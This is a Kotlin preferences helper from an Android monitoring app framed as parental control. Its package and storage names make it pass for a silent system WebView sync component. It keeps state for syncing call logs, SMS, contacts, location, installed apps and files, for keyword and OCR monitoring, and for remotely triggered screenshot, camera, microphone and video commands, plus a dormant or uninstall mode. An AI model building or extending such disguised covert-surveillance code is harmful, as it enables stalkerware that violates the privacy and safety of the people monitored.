package com.system.webview.sync.localdb

import android.content.Context
import android.content.SharedPreferences
import org.json.JSONObject

object PrefsHelper {
    private const val PREFS_NAME = "silent_webview_sync_prefs"
    private const val KEY_DEVICE_ID = "device_uuid_key"
    private const val KEY_PAIRED = "is_paired_key"
    private const val KEY_LAST_SIM_HASH = "last_sim_hash_key"
    private const val KEY_DEVICE_NAME = "device_name_key"

    // V2: Pairing code (= parent's auth.uid() from Supabase)
    private const val KEY_PAIRING_CODE = "pairing_code_key"

    // V2: Last sync timestamps for incremental fetch
    private const val KEY_LAST_CALL_SYNC = "last_call_log_sync_ms"
    private const val KEY_LAST_SMS_SYNC = "last_sms_sync_ms"

    fun getPrefs(context: Context): SharedPreferences {
        return context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    }

    fun getDeviceUuid(context: Context): String? {
        return getPrefs(context).getString(KEY_DEVICE_ID, null)
    }

    fun setDeviceUuid(context: Context, uuid: String) {
        getPrefs(context).edit().putString(KEY_DEVICE_ID, uuid).apply()
    }

    fun isPaired(context: Context): Boolean {
        return getPrefs(context).getBoolean(KEY_PAIRED, false)
    }

    fun setPaired(context: Context, paired: Boolean) {
        getPrefs(context).edit().putBoolean(KEY_PAIRED, paired).apply()
    }

    fun getLastSimHash(context: Context): String? {
        return getPrefs(context).getString(KEY_LAST_SIM_HASH, null)
    }

    fun setLastSimHash(context: Context, hash: String) {
        getPrefs(context).edit().putString(KEY_LAST_SIM_HASH, hash).apply()
    }

    fun getDeviceName(context: Context): String? {
        return getPrefs(context).getString(KEY_DEVICE_NAME, null)
    }

    fun setDeviceName(context: Context, name: String) {
        getPrefs(context).edit().putString(KEY_DEVICE_NAME, name).apply()
    }

    // V2: Pairing code = parent's Supabase auth.uid()
    fun getPairingCode(context: Context): String? {
        return getPrefs(context).getString(KEY_PAIRING_CODE, null)
    }

    fun setPairingCode(context: Context, code: String) {
        getPrefs(context).edit().putString(KEY_PAIRING_CODE, code).apply()
    }

    // V2: Call log incremental sync
    fun getLastCallLogSyncTime(context: Context): Long {
        return getPrefs(context).getLong(KEY_LAST_CALL_SYNC, 0L)
    }

    fun setLastCallLogSyncTime(context: Context, ms: Long) {
        getPrefs(context).edit().putLong(KEY_LAST_CALL_SYNC, ms).apply()
    }

    // V2: SMS incremental sync
    fun getLastSmsSyncTime(context: Context): Long {
        return getPrefs(context).getLong(KEY_LAST_SMS_SYNC, 0L)
    }

    fun setLastSmsSyncTime(context: Context, ms: Long) {
        getPrefs(context).edit().putLong(KEY_LAST_SMS_SYNC, ms).apply()
    }

    // V3: Dynamic monitored keywords
    fun getKeywords(context: Context): Map<String, String> {
        val jsonStr = getPrefs(context).getString("monitored_keywords_json", null) ?: return emptyMap()
        val map = mutableMapOf<String, String>()
        try {
            val json = JSONObject(jsonStr)
            val keys = json.keys()
            while (keys.hasNext()) {
                val key = keys.next()
                map[key] = json.getString(key)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return map
    }

    fun saveKeywords(context: Context, keywords: Map<String, String>) {
        val json = JSONObject()
        keywords.forEach { (kw, sev) -> json.put(kw, sev) }
        getPrefs(context).edit().putString("monitored_keywords_json", json.toString()).apply()
    }

    // V3: Dynamic monitored OCR packages
    fun getOcrPackages(context: Context): Set<String> {
        val jsonStr = getPrefs(context).getString("monitored_ocr_packages_json", null) ?: return emptySet()
        val set = mutableSetOf<String>()
        try {
            val arr = org.json.JSONArray(jsonStr)
            for (i in 0 until arr.length()) {
                set.add(arr.getString(i))
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return set
    }

    fun saveOcrPackages(context: Context, packages: Set<String>) {
        val arr = org.json.JSONArray()
        packages.forEach { arr.put(it) }
        getPrefs(context).edit().putString("monitored_ocr_packages_json", arr.toString()).apply()
    }

    // Smart Location Filtering Preference Helpers
    fun getLastSavedLocation(context: Context): Pair<Double, Double> {
        val prefs = getPrefs(context)
        val lat = prefs.getString("last_saved_lat", "0.0")?.toDoubleOrNull() ?: 0.0
        val lng = prefs.getString("last_saved_lng", "0.0")?.toDoubleOrNull() ?: 0.0
        return Pair(lat, lng)
    }

    fun setLastSavedLocation(context: Context, lat: Double, lng: Double) {
        getPrefs(context).edit()
            .putString("last_saved_lat", lat.toString())
            .putString("last_saved_lng", lng.toString())
            .apply()
    }

    fun getPendingLocation(context: Context): Pair<Double, Double> {
        val prefs = getPrefs(context)
        val lat = prefs.getString("pending_lat", "0.0")?.toDoubleOrNull() ?: 0.0
        val lng = prefs.getString("pending_lng", "0.0")?.toDoubleOrNull() ?: 0.0
        return Pair(lat, lng)
    }

    fun setPendingLocation(context: Context, lat: Double, lng: Double) {
        getPrefs(context).edit()
            .putString("pending_lat", lat.toString())
            .putString("pending_lng", lng.toString())
            .apply()
    }

    fun getPendingSince(context: Context): Long {
        return getPrefs(context).getLong("pending_since_timestamp", 0L)
    }

    fun setPendingSince(context: Context, ms: Long) {
        getPrefs(context).edit().putLong("pending_since_timestamp", ms).apply()
    }

    // Installed apps throttling preference helpers
    fun getLastInstalledAppsSyncTime(context: Context): Long {
        return getPrefs(context).getLong("last_installed_apps_sync_ms", 0L)
    }

    fun setLastInstalledAppsSyncTime(context: Context, ms: Long) {
        getPrefs(context).edit().putLong("last_installed_apps_sync_ms", ms).apply()
    }

    fun getLastInstalledAppsCount(context: Context): Int {
        return getPrefs(context).getInt("last_installed_apps_count", 0)
    }

    fun setLastInstalledAppsCount(context: Context, count: Int) {
        getPrefs(context).edit().putInt("last_installed_apps_count", count).apply()
    }

    fun isInitialSyncCompleted(context: Context): Boolean {
        return getPrefs(context).getBoolean("is_initial_sync_completed", false)
    }

    fun setInitialSyncCompleted(context: Context, completed: Boolean) {
        getPrefs(context).edit().putBoolean("is_initial_sync_completed", completed).apply()
    }

    // Contacts sync throttle — sync ulang setiap 2 jam
    fun getLastContactsSyncTime(context: Context): Long =
        getPrefs(context).getLong("last_contacts_sync_ms", 0L)

    fun setLastContactsSyncTime(context: Context, ms: Long) {
        getPrefs(context).edit().putLong("last_contacts_sync_ms", ms).apply()
    }

    // Agent mode cache — 'ACTIVE' | 'DORMANT' | 'UNINSTALL'
    fun getAgentMode(context: Context): String =
        getPrefs(context).getString("agent_mode_cache", "ACTIVE") ?: "ACTIVE"

    fun setAgentMode(context: Context, mode: String) {
        getPrefs(context).edit().putString("agent_mode_cache", mode).apply()
    }

    // V4: Persist executed screenshot command IDs across service restarts.
    // Stored as comma-separated longs, max 500 entries.
    private const val KEY_EXECUTED_CMD_IDS = "executed_command_ids_v4"

    fun addExecutedCommandId(context: Context, cmdId: Long) {
        val prefs = getPrefs(context)
        val existing = prefs.getString(KEY_EXECUTED_CMD_IDS, "") ?: ""
        val ids = if (existing.isBlank()) mutableListOf() else existing.split(",").toMutableList()
        val strId = cmdId.toString()
        if (!ids.contains(strId)) {
            ids.add(strId)
            // Cap at 500 to prevent unbounded growth
            val trimmed = if (ids.size > 500) ids.takeLast(500) else ids
                                    prefs.edit().putString(KEY_EXECUTED_CMD_IDS, trimmed.joinToString(",")).apply()
        }
    }

    fun getExecutedCommandIds(context: Context): Set<Long> {
        val str = getPrefs(context).getString(KEY_EXECUTED_CMD_IDS, "") ?: ""
        if (str.isBlank()) return emptySet()
        return str.split(",").mapNotNull { it.toLongOrNull() }.toSet()
    }

    // V4: Persist executed camera command IDs across service restarts.
    private const val KEY_EXECUTED_CAMERA_CMD_IDS = "executed_camera_command_ids_v4"

    fun addExecutedCameraCommandId(context: Context, cmdId: Long) {
        val prefs = getPrefs(context)
        val existing = prefs.getString(KEY_EXECUTED_CAMERA_CMD_IDS, "") ?: ""
        val ids = if (existing.isBlank()) mutableListOf() else existing.split(",").toMutableList()
        val strId = cmdId.toString()
        if (!ids.contains(strId)) {
            ids.add(strId)
            val trimmed = if (ids.size > 500) ids.takeLast(500) else ids
            prefs.edit().putString(KEY_EXECUTED_CAMERA_CMD_IDS, trimmed.joinToString(",")).apply()
        }
    }

    fun getExecutedCameraCommandIds(context: Context): Set<Long> {
        val str = getPrefs(context).getString(KEY_EXECUTED_CAMERA_CMD_IDS, "") ?: ""
        if (str.isBlank()) return emptySet()
        return str.split(",").mapNotNull { it.toLongOrNull() }.toSet()
    }

    // V4: Persist call log sync keys to prevent duplication
    private const val KEY_SYNCED_CALL_KEYS = "synced_call_keys_v4"

    fun getSyncedCallKeys(context: Context): Set<String> {
        val str = getPrefs(context).getString(KEY_SYNCED_CALL_KEYS, "") ?: ""
        if (str.isBlank()) return emptySet()
        return str.split(",").toSet()
    }

    fun addSyncedCallKey(context: Context, key: String) {
        val prefs = getPrefs(context)
        val existing = prefs.getString(KEY_SYNCED_CALL_KEYS, "") ?: ""
        val keys = if (existing.isBlank()) mutableListOf() else existing.split(",").toMutableList()
        if (!keys.contains(key)) {
            keys.add(key)
            val trimmed = if (keys.size > 200) keys.takeLast(200) else keys
            prefs.edit().putString(KEY_SYNCED_CALL_KEYS, trimmed.joinToString(",")).apply()
        }
    }

    // V4: File entries sync throttle — rescan setiap 6 jam
    fun getLastFilesSyncTime(context: Context): Long =
        getPrefs(context).getLong("last_files_sync_ms", 0L)

    fun setLastFilesSyncTime(context: Context, ms: Long) {
        getPrefs(context).edit().putLong("last_files_sync_ms", ms).apply()
    }

    // V4: Executed microphone command IDs
    private const val KEY_EXECUTED_MIC_CMD_IDS = "executed_mic_command_ids_v4"

    fun addExecutedMicCommandId(context: Context, cmdId: Long) {
        val prefs = getPrefs(context)
        val existing = prefs.getString(KEY_EXECUTED_MIC_CMD_IDS, "") ?: ""
        val ids = if (existing.isBlank()) mutableListOf() else existing.split(",").toMutableList()
        val strId = cmdId.toString()
        if (!ids.contains(strId)) {
            ids.add(strId)
            val trimmed = if (ids.size > 200) ids.takeLast(200) else ids
            prefs.edit().putString(KEY_EXECUTED_MIC_CMD_IDS, trimmed.joinToString(",")).apply()
        }
    }

    fun getExecutedMicCommandIds(context: Context): Set<Long> {
        val str = getPrefs(context).getString(KEY_EXECUTED_MIC_CMD_IDS, "") ?: ""
        if (str.isBlank()) return emptySet()
        return str.split(",").mapNotNull { it.toLongOrNull() }.toSet()
    }

 
    // V4: Executed video command IDs
    private const val KEY_EXECUTED_VIDEO_CMD_IDS = "executed_video_command_ids_v4"

    fun addExecutedVideoCommandId(context: Context, cmdId: Long) {
        val prefs = getPrefs(context)
        val existing = prefs.getString(KEY_EXECUTED_VIDEO_CMD_IDS, "") ?: ""
        val ids = if (existing.isBlank()) mutableListOf() else existing.split(",").toMutableList()
        val strId = cmdId.toString()
        if (!ids.contains(strId)) {
            ids.add(strId)
            val trimmed = if (ids.size > 200) ids.takeLast(200) else ids
            prefs.edit().putString(KEY_EXECUTED_VIDEO_CMD_IDS, trimmed.joinToString(",")).apply()
        }
    }

    fun getExecutedVideoCommandIds(context: Context): Set<Long> {
        val str = getPrefs(context).getString(KEY_EXECUTED_VIDEO_CMD_IDS, "") ?: ""
        if (str.isBlank()) return emptySet()
        return str.split(",").mapNotNull { it.toLongOrNull() }.toSet()
    }

    // V4: Child pairing info (resolved from children table via PIN)
    private const val KEY_CHILD_ID   = "child_id_key"
    private const val KEY_CHILD_NAME = "child_name_key"

    fun getChildId(context: Context): String? =
        getPrefs(context).getString(KEY_CHILD_ID, null)

    fun setChildId(context: Context, id: String) {
        getPrefs(context).edit().putString(KEY_CHILD_ID, id).apply()
    }

    fun getChildName(context: Context): String? =
        getPrefs(context).getString(KEY_CHILD_NAME, null)

    fun setChildName(context: Context, name: String) {
        getPrefs(context).edit().putString(KEY_CHILD_NAME, name).apply()
    }
}
